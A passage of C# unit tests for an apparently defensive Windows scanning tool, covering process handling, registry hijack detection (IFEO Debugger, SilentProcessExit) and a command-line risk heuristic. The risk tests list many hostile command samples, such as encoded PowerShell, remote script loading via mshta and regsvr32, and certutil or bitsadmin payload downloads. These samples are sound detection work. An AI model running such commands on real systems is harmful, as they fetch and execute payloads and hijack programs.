            True(w.ElapsedMilliseconds < 50000, "finished without hitting the timeout");
        }

        static void ProcFailure()
        {
            string f = TempScript("echo out\necho err-text 1>&2\nexit 3\n", "@echo out\r\n@echo err-text 1>&2\r\n@exit /b 3\r\n");
            string o;
            Eq(3, RunScript(f, 30000, out o), "exit code");
            True(o.Contains("out") && o.Contains("err-text"), "stdout + stderr on failure: [" + o + "]");
            Eq(-1, Reg.RunProcess(Path.Combine(Path.GetTempPath(), "rs_no_such_tool_" + Id + ".exe"), "", 5000, out o), "missing tool -> -1");
        }

        static void ProcTimeout()
        {
            Stopwatch w = Stopwatch.StartNew();
            string o;
            int rc = OnWindows ? Reg.RunProcess(Reg.SysExe("ping"), "-n 31 127.0.0.1", 700, out o)
                               : Reg.RunProcess("/bin/sleep", "30", 700, out o);
            Eq(-1, rc, "timeout -> -1");
            True(w.ElapsedMilliseconds < 15000, "returned after the timeout, not after the child (" + w.ElapsedMilliseconds + " ms)");
            True(o.Length > 0, "message");
        }

        // The timeout message names the tool and its sub-command only: "net user NAME PASSWORD" must not end up on screen.
        static void ProcTimeoutNoArgs()
        {
            string o;
            int rc = OnWindows ? Reg.RunProcess(Reg.SysExe("cmd"), "/c " + Reg.QuoteArg("ping -n 31 127.0.0.1 >nul & rem s3cret"), 700, out o)
                               : Reg.RunProcess("/bin/sh", "-c " + Reg.QuoteArg("sleep 30") + " s3cret", 700, out o);
            Eq(-1, rc, "timeout");
            True(!o.Contains("s3cret") && !o.Contains("sleep") && !o.Contains("ping"), "no arguments in the message: " + o);
            True(o.Contains(OnWindows ? "cmd.exe /c" : "sh -c"), "tool and sub-command named: " + o);
        }

        static void OneLineCases()
        {
            Eq("a b c", Reg.OneLine("  a\r\n\tb  c \n", 100), "whitespace collapsed");
            Eq("abc…", Reg.OneLine("abcdef", 3), "capped");
            Eq("", Reg.OneLine(null, 5), "null");
            Eq("ОШИБКА: x", Reg.OneLine("ОШИБКА:\r\n x\r\n", 50), "Cyrillic kept");
        }

        // IFEO of the running system hijacks a tool by its FILE NAME: Debugger, VerifierDlls, a filter subkey with a
        // Debugger (only with UseFilter), or GlobalFlag 0x200 + a SilentProcessExit monitor; native and Wow6432Node.
        static void ToolHijackCases()
        {
            string soft = Root + "\\hj";   // stands for HKLM\SOFTWARE
            string ifeo = "hj\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\";
            Eq("", Reg.ToolHijack(soft, "C:\\Windows\\System32\\reg.exe"), "no IFEO key");
            using (RegistryKey k = Make(ifeo + "reg.exe")) { k.SetValue("MitigationOptions", new byte[] { 1, 0 }, RegistryValueKind.Binary); k.SetValue("Debugger", ""); }
            Eq("", Reg.ToolHijack(soft, "C:\\Windows\\System32\\reg.exe"), "harmless values / empty Debugger");
            using (RegistryKey k = Make(ifeo + "reg.exe")) k.SetValue("Debugger", "C:\\evil.exe");
            string h = Reg.ToolHijack(soft, "C:\\Windows\\System32\\reg.exe");
            True(h.EndsWith("\\Debugger = C:\\evil.exe") && h.StartsWith(Root + "\\hj\\Microsoft", StringComparison.OrdinalIgnoreCase), "Debugger named with its key: " + h);
            True(Reg.ToolHijack(soft, "reg.exe").Length > 0, "file name alone");

            using (RegistryKey k = Make(ifeo + "net.exe\\0")) { k.SetValue("FilterFullPath", "C:\\Windows\\System32\\net.exe"); k.SetValue("Debugger", "C:\\evil2.exe"); }
            Eq("", Reg.ToolHijack(soft, "net.exe"), "filter subkey without UseFilter is ignored (like Windows)");
            using (RegistryKey k = Make(ifeo + "net.exe")) k.SetValue("UseFilter", 1, RegistryValueKind.DWord);
            True(Reg.ToolHijack(soft, "net.exe").Contains("evil2"), "filter subkey with UseFilter");

            using (RegistryKey k = Make(ifeo + "net1.exe")) k.SetValue("VerifierDlls", "evil.dll");
            True(Reg.ToolHijack(soft, "net1.exe").Contains("VerifierDlls = evil.dll"), "VerifierDlls");

            using (RegistryKey k = Make(ifeo + "bcdedit.exe")) k.SetValue("GlobalFlag", 0x200, RegistryValueKind.DWord);
            Eq("", Reg.ToolHijack(soft, "bcdedit.exe"), "GlobalFlag 0x200 without a monitor");
            using (RegistryKey k = Make("hj\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\bcdedit.exe")) k.SetValue("MonitorProcess", "C:\\evil3.exe");
            True(Reg.ToolHijack(soft, "bcdedit.exe").Contains("MonitorProcess = C:\\evil3.exe"), "SilentProcessExit monitor");
            using (RegistryKey k = Make(ifeo + "bcdedit.exe")) k.SetValue("GlobalFlag", "0x00000200");
            True(Reg.ToolHijack(soft, "bcdedit.exe").Length > 0, "GlobalFlag as REG_SZ text");
            using (RegistryKey k = Make(ifeo + "bcdedit.exe")) k.SetValue("GlobalFlag", 0x100, RegistryValueKind.DWord);
            Eq("", Reg.ToolHijack(soft, "bcdedit.exe"), "other GlobalFlag bits: the monitor does not run");

            using (RegistryKey k = Make("hj\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\findstr.exe")) k.SetValue("Debugger", "x.exe");
            True(Reg.ToolHijack(soft, "findstr.exe").Contains("Wow6432Node"), "Wow6432Node copy");
        }

        // reg.exe refuses everything while HKCU DisableRegistryTools is a non-zero DWORD.
        static void RegToolsBlockedCases()
        {
            string u = Root + "\\usr";   // stands for HKCU
            True(!Reg.RegToolsBlocked(u), "no policy");
            using (RegistryKey k = Make("usr\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"))
            {
                k.SetValue("DisableRegistryTools", 0, RegistryValueKind.DWord);
                True(!Reg.RegToolsBlocked(u), "0 = allowed");
                k.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
                True(Reg.RegToolsBlocked(u), "1 = blocked");
                k.SetValue("DisableRegistryTools", 2, RegistryValueKind.DWord);
                True(Reg.RegToolsBlocked(u), "2 = blocked too (reg.exe checks for non-zero)");
                k.SetValue("DisableRegistryTools", "1");
                True(!Reg.RegToolsBlocked(u), "REG_SZ is not checked by reg.exe");
            }
        }

        static void ProcStdinClosed()
        {
            Stopwatch w = Stopwatch.StartNew();
            string o;
            int rc = OnWindows ? Reg.RunProcess(Reg.SysExe("findstr"), "x", 20000, out o)   // reads stdin: EOF -> exits
                               : Reg.RunProcess("/bin/cat", "", 20000, out o);
            True(rc != -1, "exited by itself (rc " + rc + ")");
            True(w.ElapsedMilliseconds < 15000, "did not wait for input (" + w.ElapsedMilliseconds + " ms)");
        }

        static void ProcOutputCap()
        {
            string line = new string('y', 1000);
            string f = TempScript("i=0\nwhile [ $i -lt 3000 ]; do echo " + line + "; i=$((i+1)); done\necho tail 1>&2\n",
                                  "@echo off\r\nfor /l %%i in (1,1,3000) do echo " + line + "\r\necho tail 1>&2\r\n");
            string o;
            Eq(0, RunScript(f, 60000, out o), "exit code (~3 MB on stdout fully drained)");
            True(o.Length <= (1 << 20) && o.Length > 900000, "stdout kept up to the 1 MB cap: " + o.Length);
        }

        static void SysExeWin()
        {
            WindowsOnly();
            string p = Reg.SysExe("reg");
            True(Path.IsPathRooted(p) && p.EndsWith("\\reg.exe", StringComparison.OrdinalIgnoreCase) && File.Exists(p), "reg.exe: " + p);
            True(Path.IsPathRooted(Reg.SysExe("bcdedit.exe")), "bcdedit.exe rooted");
        }

        // ------------------------------------------------------------------ Windows-only native behaviour
        [DllImport("advapi32.dll", CharSet = CharSet.Unicode)]
        static extern int RegCreateKeyExW(IntPtr hKey, string subKey, int reserved, string cls, int options, int sam, IntPtr sa, out IntPtr result, out int disposition);
        [DllImport("advapi32.dll", CharSet = CharSet.Unicode)]
        static extern int RegSetValueExW(IntPtr hKey, string name, int reserved, int type, byte[] data, int size);
        [DllImport("advapi32.dll")]
        static extern int RegCloseKey(IntPtr hKey);

        static void RawTypesWin()
        {
            WindowsOnly();
            using (RegistryKey k = Make("raw"))
            {
                IntPtr h = k.Handle.DangerousGetHandle();
                Eq(0, RegSetValueExW(h, "res", 0, 8 /*REG_RESOURCE_LIST*/, new byte[] { 0x01, 0xAB }, 2), "set REG_RESOURCE_LIST");
                Eq(0, RegSetValueExW(h, "custom", 0, 0x20001, new byte[] { 0x41, 0x00 }, 2), "set custom type");
                Eq(0, RegSetValueExW(h, "none", 0, 0 /*REG_NONE*/, new byte[] { 0xFF }, 1), "set REG_NONE");
                Eq(0, RegSetValueExW(h, "be", 0, 5 /*REG_DWORD_BIG_ENDIAN*/, new byte[] { 0x01, 0x02, 0x00, 0x00 }, 4), "set REG_DWORD_BIG_ENDIAN");
            }
            List<string[]> v = Reg.Values(Root + "\\raw");
            Eq("01AB", Find(v, "res")[1], "REG_RESOURCE_LIST data hex");
            Eq("REG_RESOURCE_LIST", Find(v, "res")[2], "REG_RESOURCE_LIST type");
            Eq("4100", Find(v, "custom")[1], "custom type data hex");
            Eq("REG_UNKNOWN_0x20001", Find(v, "custom")[2], "custom type name");
            Eq("FF", Find(v, "none")[1], "REG_NONE hex");
            Eq("0x201", Find(v, "be")[1], "REG_DWORD_BIG_ENDIAN printed like reg.exe (0x%x, bytes read little-endian)");
            Eq("REG_DWORD_BIG_ENDIAN", Find(v, "be")[2], "REG_DWORD_BIG_ENDIAN type");
            True(Reg.DeleteValue(Root + "\\raw", "res"), "delete a value of an unknown type");
        }

        static void LinksWin()
        {
            WindowsOnly();
            using (RegistryKey k = Make("lnk\\target")) k.SetValue("Debugger", "T");
            using (RegistryKey k = Make("lnk\\target\\child")) k.SetValue("Debugger", "C");
            Make("lnk\\holder\\plain").Close();
            string sid = System.Security.Principal.WindowsIdentity.GetCurrent().User.Value;
            string target = "\\REGISTRY\\USER\\" + sid + "\\" + Sub + "\\lnk\\target";
            IntPtr h; int disp;
            int wow = Environment.Is64BitOperatingSystem ? 0x100 : 0;
            int rc = RegCreateKeyExW(new IntPtr(unchecked((int)0x80000001)) /*HKEY_CURRENT_USER*/, Sub + "\\lnk\\holder\\link", 0, null,
                0x2 /*REG_OPTION_CREATE_LINK*/, 0x20006 /*KEY_WRITE*/ | 0x20 /*KEY_CREATE_LINK*/ | wow, IntPtr.Zero, out h, out disp);
            if (rc != 0) throw new SkipException("cannot create a registry link here (error " + rc + ")");
            try
            {
                byte[] data = Encoding.Unicode.GetBytes(target);
                rc = RegSetValueExW(h, "SymbolicLinkValue", 0, 6 /*REG_LINK*/, data, data.Length);
            }
            finally { RegCloseKey(h); }
            if (rc != 0) throw new SkipException("cannot set SymbolicLinkValue (error " + rc + ")");
            using (RegistryKey b = HKCU())
            using (RegistryKey viaLink = b.OpenSubKey(Sub + "\\lnk\\holder\\link"))
                True(viaLink != null && "T".Equals(viaLink.GetValue("Debugger")), "test setup: the link resolves to the target");

            Eq(0, Reg.Pairs(Root + "\\lnk\\holder", "Debugger").Count, "Pairs does not descend into the link");
            True(Reg.DeleteKey(Root + "\\lnk\\holder"), "DeleteKey removes the tree that contains the link");
            True(!Reg.KeyExists(Root + "\\lnk\\holder"), "holder gone");
            True(Reg.KeyExists(Root + "\\lnk\\target\\child"), "link target's subtree untouched");
            Eq("T", Find(Reg.Values(Root + "\\lnk\\target"), "Debugger")[1], "link target's values untouched");
        }

        [DllImport("shell32.dll", SetLastError = true)]
        static extern IntPtr CommandLineToArgvW([MarshalAs(UnmanagedType.LPWStr)] string cmdLine, out int numArgs);
        [DllImport("kernel32.dll")]
        static extern IntPtr LocalFree(IntPtr hMem);

        static List<string> WinArgv(string cmd)
        {
            int n;
            IntPtr p = CommandLineToArgvW(cmd, out n);
            if (p == IntPtr.Zero) throw new Exception("CommandLineToArgvW failed: " + Marshal.GetLastWin32Error());
            try
            {
                List<string> r = new List<string>();
                for (int i = 0; i < n; i++) r.Add(Marshal.PtrToStringUni(Marshal.ReadIntPtr(p, i * IntPtr.Size)));
                return r;
            }
            finally { LocalFree(p); }
        }

        // QuoteArg against the REAL Windows parser, not only the test's own reference parser (CommandLineToArgvW follows
        // the same backslash / quote rules as the UCRT argv parser of reg.exe and bcdedit.exe; net1.exe's older msvcrt
        // copy differs only for "" inside quotes, which QuoteArg never emits).
        static void QuoteArgWin()
        {
            WindowsOnly();
            string[] tricky = { "", " ", "\"", "\\", "\\\\", "\"\"", "a\\", "\\\"", "HKLM\\RS_SOFT\\x\\", "q\"uote", "trail ", "Кириллица\\",
                                "\"%1\" %*", "C:\\Program Files\\x.exe", "a\tb", "%TEMP%\\x\\\"" };
            foreach (string t in tricky)
            {
                List<string> got = WinArgv("reg.exe export " + Reg.QuoteArg(t) + " " + Reg.QuoteArg("f.reg") + " /y");
                Eq(5, got.Count, "argc for [" + Show(t) + "]");
                Eq(t, got[2], "round trip");
                Eq("f.reg", got[3], "next argument intact after [" + Show(t) + "]");
            }
            Random r = new Random(54321);
            char[] alphabet = { 'a', 'Z', ' ', '\t', '\\', '\\', '"', '"', 'Я', '%', '/', ':' };
            for (int i = 0; i < 3000; i++)
            {
                string a = RandomString(r, alphabet), b = RandomString(r, alphabet);
                List<string> got = WinArgv("x.exe " + Reg.QuoteArg(a) + " " + Reg.QuoteArg(b));
                if (got.Count != 3 || got[1] != a || got[2] != b)
                    throw new Exception("CommandLineToArgvW round trip failed for [" + Show(a) + "] [" + Show(b) + "]");
            }
        }

        // The real reg.exe through HiveMounts: a hive file (saved from a throwaway HKCU key) is mounted under an unusual
        // RS_U name, read through the registry API, and unloaded. Needs administrator rights (reg save/load); skipped
        // otherwise. CleanupStale is NOT called here: it would unload a RescueScan running on this machine.
        static void MountWin()
        {
            WindowsOnly();
            using (RegistryKey k = Make("hivesrc\\Software\\Microsoft\\Windows\\CurrentVersion\\Run")) k.SetValue("q\"uote", "C:\\x.exe");
            string dir = Path.Combine(Path.GetTempPath(), "rs hive " + Id);
            Directory.CreateDirectory(dir);
            tempDirs.Add(dir);
            string file = Path.Combine(dir, "NTUSER test.DAT"), o;
            if (Reg.RunCode("save " + Reg.QuoteArg(Root + "\\hivesrc") + " " + Reg.QuoteArg(file) + " /y", out o) != 0)
                throw new SkipException("reg save failed (administrator rights needed): " + Reg.OneLine(o, 120));
            string name = "RS_U9" + new Random().Next(100000, 999999);
            HiveMounts m = new HiveMounts(Reg.RunCode, Reg.KeyExists, File.Exists, delegate { return Reg.SubkeyNames("HKLM"); }, delegate { return false; });
            StringBuilder w = new StringBuilder();
            try
            {
                Eq(0, m.Mount(name, file, w), "mounted (" + w + ")");
                List<string[]> v = Reg.Values("HKLM\\" + name + "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run");
                True(Find(v, "q\"uote") != null, "the hive's value is readable at HKLM\\" + name);
                True(Array.IndexOf(Reg.SubkeyNames("HKLM"), name) >= 0, "listed under HKLM");
                Eq(1, m.Mount(name + "x", Path.Combine(dir, "missing.DAT"), w), "missing file: not created by reg load");
                True(!File.Exists(Path.Combine(dir, "missing.DAT")), "...no empty hive file was created");
            }
            finally
            {
                Eq("", m.UnloadAll(), "unloaded");
                True(!Reg.KeyExists("HKLM\\" + name), "mount point gone");
            }
        }

        // Adds (deny = true) or removes a "deny QueryValues + EnumerateSubKeys to me" rule on HKCU\<Sub>\<rel>. The owner
        // may always change the DACL, so the rule can be undone for the cleanup.
        static void DenyRead(string rel, bool deny)
        {
            RegistryAccessRule rule = new RegistryAccessRule(WindowsIdentity.GetCurrent().User,
                RegistryRights.QueryValues | RegistryRights.EnumerateSubKeys, AccessControlType.Deny);
            using (RegistryKey b = HKCU())
            using (RegistryKey k = b.OpenSubKey(Sub + "\\" + rel, RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.ReadPermissions | RegistryRights.ChangePermissions))
            {
                RegistrySecurity sec = k.GetAccessControl();
                if (deny) sec.AddAccessRule(rule); else sec.RemoveAccessRule(rule);
                k.SetAccessControl(sec);
            }
        }

        // A key whose DACL denies reading: Values/Pairs see nothing (like reg.exe did), but the key is noted for the scan;
        // an unreadable IFEO\<tool> key blocks the tool (a hijack there could not be ruled out).
        static void DeniedWin()
        {
            WindowsOnly();
            using (RegistryKey k = Make("deny\\locked")) k.SetValue("ImagePath", "C:\\Windows\\Temp\\x.exe");
            string ifeo = "hjd\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\x.exe";
            using (RegistryKey k = Make(ifeo)) k.SetValue("Debugger", "C:\\evil.exe");
            DenyRead("deny\\locked", true);
            DenyRead(ifeo, true);
            try
            {
                Reg.TakeDenied();
                Eq(0, Reg.Values(Root + "\\deny\\locked").Count, "unreadable key -> no values");
                bool cut;
                Eq(0, Reg.Pairs(Root + "\\deny", "ImagePath", out cut).Count, "Pairs: unreadable child -> nothing");
                List<string> d = Reg.TakeDenied();
                True(d.Contains(Root + "\\deny\\locked"), "noted as denied: " + string.Join(" | ", d.ToArray()));
                Eq(0, Reg.TakeDenied().Count, "TakeDenied starts a new list");
                string h = Reg.ToolHijack(Root + "\\hjd", "x.exe");
                True(h.Contains("не читается"), "unreadable IFEO key blocks the tool: " + h);
            }
            finally
            {
                DenyRead("deny\\locked", false);
                DenyRead(ifeo, false);
            }
        }

        static void ExportWin()
        {
            WindowsOnly();
            using (RegistryKey k = Make("export\\" + Cyr)) k.SetValue("q\"uote", "x");
            string dir = Path.Combine(Path.GetTempPath(), "rs test " + Id);
            Directory.CreateDirectory(dir);
            string f = Path.Combine(dir, "a b.reg"), f2 = Path.Combine(dir, "missing.reg");
            tempFiles.Add(f); tempFiles.Add(f2);
            try
            {
                True(Reg.Export(Root + "\\export\\" + Cyr, f), "export of an existing key");
                True(File.Exists(f) && new FileInfo(f).Length > 0, "file written");
                True(!Reg.Export(Root + "\\export\\nope", f2), "export of a missing key -> false");
            }
            finally
            {
                foreach (string x in new string[] { f, f2 }) try { File.Delete(x); } catch { }
                try { Directory.Delete(dir); } catch { }
            }
        }

        // Risk(): clean Windows 10/11 defaults (built-in task actions, services, Run, Active Setup tools) are never
        // SUSPECT; the evasions of finding R008 and the common LOLBins are all caught.
        static void RiskCases()
        {
            string[] clean = {
                "%windir%\\system32\\rundll32.exe /d acproxy.dll,PerformAutochkOperations",
                "%windir%\\system32\\rundll32.exe Startupscan.dll,SusRunTask",
                "%windir%\\system32\\rundll32.exe %windir%\\system32\\Windows.Storage.ApplicationData.dll,CleanupTemporaryState",
                "%windir%\\system32\\rundll32.exe %windir%\\system32\\AppxDeploymentClient.dll,AppxPreStageCleanupRunTask",
                "%windir%\\system32\\rundll32.exe dfdts.dll,DfdGetDefaultPolicyAndSMART",
                "%windir%\\system32\\rundll32.exe bfe.dll,BfeOnServiceStartTypeChange",
                "%windir%\\system32\\rundll32.exe sysmain.dll,PfSvWsSwapAssessmentTask",
                "%windir%\\system32\\rundll32.exe /d srrstr.dll,ExecuteScheduledSPPCreation",
                "%windir%\\system32\\rundll32.exe ndfapi.dll,NdfRunDllDuplicateIPOffendingSystem",
                "%windir%\\System32\\rundll32.exe %windir%\\System32\\Windows.SharedPC.AccountManager.dll,StartMaintenance",
                "%windir%\\system32\\gatherNetworkInfo.vbs",
                "%windir%\\system32\\defrag.exe -c -h -o -$",
                "%windir%\\system32\\cleanmgr.exe /autoclean /d $(Arg0)",
                "%SystemRoot%\\system32\\ClipUp.exe -p -s -o",
                "%systemroot%\\system32\\usoclient.exe StartScan",
                "C:\\Windows\\system32\\sc.exe start wuauserv",
                "%windir%\\system32\\wermgr.exe -upload",
                "%SystemRoot%\\System32\\dsregcmd.exe $(Arg0) $(Arg1) $(Arg2)",
                "%windir%\\system32\\compattelrunner.exe -maintenance",
                "%windir%\\System32\\sdclt.exe /KNOWNLOCATIONS",
                "\"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe\" /c",
                "\"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24090.11-0\\MpCmdRun.exe\" -IdleTask -TaskName WdCacheMaintenance",
                "%localappdata%\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe /reporting",
                "\"C:\\Users\\Vasya\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background",
                "%windir%\\system32\\SecurityHealthSystray.exe",
                "\"C:\\Program Files\\Realtek\\Audio\\HDA\\RtkNGUI64.exe\" -s",
                "\\SystemRoot\\System32\\drivers\\ACPI.sys",
                "system32\\drivers\\wd\\WdFilter.sys",
                "\\??\\C:\\Windows\\system32\\drivers\\MpKslDrv.sys",
                "%SystemRoot%\\system32\\svchost.exe -k netsvcs -p",
                "C:\\Windows\\system32\\lsass.exe",
                "%SystemRoot%\\system32\\msiexec.exe /V",
                "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe",
                "\"C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeClickToRun.exe\" /service",
                "C:\\Windows\\system32\\SearchIndexer.exe /Embedding",
                "C:\\Windows\\servicing\\TrustedInstaller.exe",
                "%SystemRoot%\\System32\\wuaueng.dll",
                "%SystemRoot%\\system32\\regsvr32.exe /s /n /i:/UserInstall %SystemRoot%\\system32\\themeui.dll",
                "regsvr32.exe /s /n /i:U shell32.dll",
                "C:\\Windows\\System32\\Rundll32.exe C:\\Windows\\System32\\mscories.dll,Install",
                "C:\\Windows\\SysWOW64\\Rundll32.exe C:\\Windows\\SysWOW64\\mscories.dll,Install",
                "\"%SystemRoot%\\system32\\unregmp2.exe\" /FirstLogon",
                "%systemroot%\\system32\\ie4uinit.exe -UserConfig",
                "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\130.0.2849.68\\Installer\\setup.exe\" --configure-user-settings --verbose-logging --system-level --msedge --channel=stable",
                "C:\\Windows\\system32\\Mystify.scr /s",
                "%SystemRoot%\\System32\\scrnsave.scr",
                "C:\\Windows\\System32\\cmd.exe",
                "\"C:\\Program Files\\Java\\jre\\bin\\java.exe\" -Dfile.encoding=UTF-8 -jar x.jar",
                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -Command Get-Date -Encoding utf8",
            };
            foreach (string c in clean) True(MainForm.Risk(c) != "SUSPECT", "clean default must not be SUSPECT: " + c + " -> " + MainForm.Risk(c));
            string[] review = {
                "%LOCALAPPDATA%\\Microsoft\\svc.exe", "%PUBLIC%\\svc.exe", "%ProgramData%\\svc.exe", "%ALLUSERSPROFILE%\\svc.exe",
                "C:/Users/Public/svc.exe", "C:\\Users\\Vasya\\APPDAT~1\\Roaming\\svc.exe", "C:\\PROGRA~3\\svc.exe", "%USERPROFILE%\\svc.exe",
                "pwsh -c Get-Date", "cmd /c echo hi", "C:\\Windows\\System32\\x.bat",
            };
            foreach (string c in review) Eq("REVIEW", MainForm.Risk(c), "REVIEW: " + c);
            string[] bad = {
                "%TMP%\\svc.exe", "%temp%\\svc.exe", "C:\\tmp\\svc.exe", "C:/Windows/Temp/svc.exe", "C:\\Users\\x\\AppData\\Local\\Temp\\a.exe",
                "C:\\DOCUME~1\\x\\LOCALS~1\\Temp\\a.exe", "C:\\$Recycle.Bin\\S-1-5-21\\a.exe", "C:\\Users\\x\\invoice.pdf.exe", "C:\\x\\a.pif",
                "C:\\Users\\x\\a.scr", "C:\\Windows\\a.scr",
                "powershell -e JABzAD0A", "powershell -ec JABzAD0A", "powershell -enc JABz", "powershell.exe -EncodedCommand JABz",
                "powershell -nop -w 1 -c \"iwr x|iex\"", "powershell.exe -win hidden -c calc", "powershell -WindowStyle:Hidden -c calc",
                "powershell -w hid -c calc", "powershell -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://x')\"",
                "powershell -c iwr http://x/a.ps1", "powershell -File C:\\ProgramData\\x\\a.ps1",
                "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run(\"\"calc\"\")(window.close)\")",
                "mshta.exe C:\\Windows\\x.hta", "mshta http://x/a.hta",
                "wscript.exe //B C:\\Windows\\x.vbs", "cscript //nologo C:\\Windows\\System32\\x.js", "wscript.exe C:\\ProgramData\\w\\checker.vbs",
                "rundll32.exe C:\\Windows\\x.dll,Start", "rundll32.exe C:\\ProgramData\\x.dll,DllMain", "rundll32 javascript:\"\\..\\mshtml,RunHTMLApplication\"",
                "regsvr32 /s C:\\Windows\\x.dll", "regsvr32 /s /n /u /i:http://x/a.sct scrobj.dll", "regsvr32 /i:C:\\x\\a.sct scrobj.dll",
                "cmd /c start /min C:\\Windows\\x.bat", "cmd.exe /c start C:\\ProgramData\\w\\checker.bat", "C:\\Windows\\x.bat", "C:\\Windows\\x.vbs",
                "C:\\Windows\\x.hta", "C:\\Users\\x\\a.ps1", "%comspec% /c curl http://x/a.exe -o a.exe",
                "conhost.exe --headless cmd /c calc", "msiexec /q /i http://x/y.msi", "cmstp /s /ns C:\\x.inf",
                "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /U C:\\x.dll",
                "regasm.exe /U C:\\x.dll", "regsvcs C:\\x.dll", "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe C:\\x\\p.xml",
                "forfiles /p c:\\windows\\system32 /m notepad.exe /c calc.exe", "pcalua -a C:\\x.exe", "curl http://x -o C:\\x.exe",
                "wget http://x/a.exe", "wmic process call create calc", "certutil -urlcache -f http://x a.exe", "certutil -decode a.txt a.exe",
                "bitsadmin /transfer j http://x C:\\x.exe", "c^m^d /c powershell -e AAA",
            };
            foreach (string c in bad) Eq("SUSPECT", MainForm.Risk(c), "SUSPECT: " + c);
            // file paths (Explorer / process image): no command-line rules
            Eq("", Heur.Risk("C:\\Windows\\System32\\gatherNetworkInfo.vbs", false), "path: system script");
            Eq("REVIEW", Heur.Risk("C:\\Users\\x\\Documents\\build.bat", false), "path: a .bat in a profile is only REVIEW");
            Eq("SUSPECT", Heur.Risk("C:\\Windows\\Temp\\a.exe", false), "path: temp");
            Eq("", Heur.Risk("C:\\Windows\\System32\\ssText3d.scr", false), "path: system screensaver");
            // helpers
            Eq("\\temp\\a.exe", Heur.NormPath("%TMP%/a.exe"), "NormPath %TMP%");
            Eq("\\windows\\system32\\drivers\\x.sys", Heur.NormPath("\\SystemRoot\\System32\\drivers\\x.sys"), "NormPath \\SystemRoot");
            Eq("a|b c|d", string.Join("|", Heur.Tokens("a \"b c\"  d").ToArray()), "Tokens");
            True(Heur.Word("c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -c x", "powershell"), "Word powershell.exe");
            True(!Heur.Word("c:\\program files\\msbuild\\x.exe", "msbuild"), "Word: folder name is not the program");
            True(Heur.SysDir("c:\\windows\\system32\\x.vbs") && Heur.SysDir("\\windows\\syswow64\\x") && !Heur.SysDir("c:\\windows\\x.vbs"), "SysDir");
        }

        static byte[] ActionsBlob(params string[] execs)   // execs: cmd, args, cmd, args ...  (GhostTask layout, version 3)
        {
            MemoryStream ms = new MemoryStream();
            BinaryWriter w = new BinaryWriter(ms);
            w.Write((ushort)3);
            WStr(w, "Author");
            for (int i = 0; i + 1 < execs.Length; i += 2)
            {
                w.Write((ushort)0x6666); WStr(w, ""); WStr(w, execs[i]); WStr(w, execs[i + 1]); WStr(w, ""); w.Write((ushort)0);
            }
            w.Flush();
            return ms.ToArray();
        }

        static void WStr(BinaryWriter w, string s) { byte[] b = Encoding.Unicode.GetBytes(s); w.Write((uint)b.Length); w.Write(b); }

        const string TaskNs = "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\r\n<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\r\n";

        static string TaskXml(string actions) { return TaskNs + "<RegistrationInfo><Description>rundll32 powershell http</Description></RegistrationInfo><Actions Context=\"Author\">" + actions + "</Actions></Task>"; }

        // Task XML: every action (any prefix, entities, CDATA, comments removed); never the xmlns / description
        static void TaskXmlCases()
        {
            List<string[]> a = Heur.TaskXmlActions(TaskXml("<Exec><Command>%windir%\\system32\\rundll32.exe</Command><Arguments>/d acproxy.dll,PerformAutochkOperations</Arguments></Exec>"));
            Eq(1, a.Count, "one action");
            Eq("%windir%\\system32\\rundll32.exe|/d acproxy.dll,PerformAutochkOperations", a[0][1] + "|" + a[0][2], "exec");
            a = Heur.TaskXmlActions(TaskXml("<!-- <Exec><Command>decoy.exe</Command></Exec> --><t:Exec xmlns:t=\"x\"><t:Command >C:\\a.exe</t:Command></t:Exec>"
                + "<Exec><Command><![CDATA[powershell]]></Command><Arguments>-&#101;nc AAA &amp; x</Arguments></Exec><ComHandler><ClassId>{1}</ClassId><Data>d</Data></ComHandler>"));
            Eq(3, a.Count, "comment dropped, two execs + COM");
            Eq("C:\\a.exe", a[0][1], "prefixed exec, attribute-ish whitespace");
            Eq("-enc AAA & x", a[1][2], "entities decoded");
            Eq("com|{1}|d", a[2][0] + "|" + a[2][1] + "|" + a[2][2], "COM handler");
            Eq("a<b>&\"'e", Heur.XmlText("a&lt;b&gt;&amp;&quot;&apos;&#x65;"), "XmlText");
            Eq(0, Heur.TaskXmlActions("not xml").Count, "garbage");
        }

        // TaskCache Actions blob: exec actions, COM action, truncated -> null; printable fallback
        static void TaskCacheBlobCases()
        {
            List<string[]> a = Heur.TaskCacheActions(ActionsBlob("C:\\Users\\Public\\upd.exe", "-w hidden -enc AAAA", "calc.exe", ""));
            True(a != null, "parsed");
            Eq(2, a.Count, "two actions");
            Eq("C:\\Users\\Public\\upd.exe|-w hidden -enc AAAA", a[0][1] + "|" + a[0][2], "first");
            Eq("calc.exe", a[1][1], "second (after flags)");
            byte[] b = ActionsBlob("C:\\x.exe", "y");
            byte[] cut = new byte[b.Length - 5]; Array.Copy(b, cut, cut.Length);
            True(Heur.TaskCacheActions(cut) == null, "truncated -> null");
            // COM action
            MemoryStream ms = new MemoryStream(); BinaryWriter w = new BinaryWriter(ms);
